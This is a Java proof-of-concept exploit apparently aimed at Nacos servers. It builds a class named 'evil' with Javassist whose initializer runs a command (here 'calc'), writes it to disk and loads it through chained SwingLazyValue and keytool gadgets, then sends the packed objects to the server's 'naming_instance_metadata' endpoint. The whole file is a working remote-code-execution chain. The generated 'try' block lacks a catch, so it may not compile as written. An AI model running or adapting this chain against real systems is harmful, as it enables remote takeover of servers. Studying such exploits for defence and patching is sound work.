package com.exp.nacos;

import javassist.*;
import sun.swing.SwingLazyValue;

public class calcExp {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("evil");

        CtConstructor cs = ctClass.makeClassInitializer();
        cs.setBody("try {\n" +
                "  Runtime.getRuntime().exec(\"calc\");\n" +
                " }");
        byte[] classBytes = ctClass.toBytecode();

        SwingLazyValue lazyValue1 = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"./evil.class", classBytes});
        SwingLazyValue lazyValue2 = new SwingLazyValue("sun.security.tools.keytool.Main", "main", new Object[]{new String[]{
                "-LIST",
                "-provider:",
                "evil",
                "-keystore",
                "NONE",
                "-protected",
                "-debug",
                "-providerpath",
                "./"
        }});

        utils.sendRequest(utils.packMetadataObject(lazyValue1), "naming_instance_metadata");
        utils.sendRequest(utils.packMetadataObject(lazyValue2), "naming_instance_metadata");
    }
}
